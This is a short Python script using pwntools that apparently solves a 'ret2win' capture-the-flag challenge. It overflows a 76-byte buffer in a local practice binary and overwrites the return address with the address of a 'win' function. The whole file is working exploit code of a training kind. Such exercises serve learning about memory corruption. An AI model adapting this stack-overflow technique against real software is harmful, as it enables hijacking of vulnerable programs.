from pwn import *

context.binary = binary = ELF("./ret2win", checksec=False)
context.log_level = "CRITICAL"

# The offset is 76
offset = 76
# Define the bufefr (76 A's)
buffer = b"A"*offset
# Pack the address of the win function into a valid 32-bit memory address
win = p32(0x08049176)

# The payload is the 76 A's + the address of the win function
payload = buffer + win

# Run the binary
p = binary.process()
# Send the payload
p.sendline(payload)
# Receive the output
print(p.recvallS())
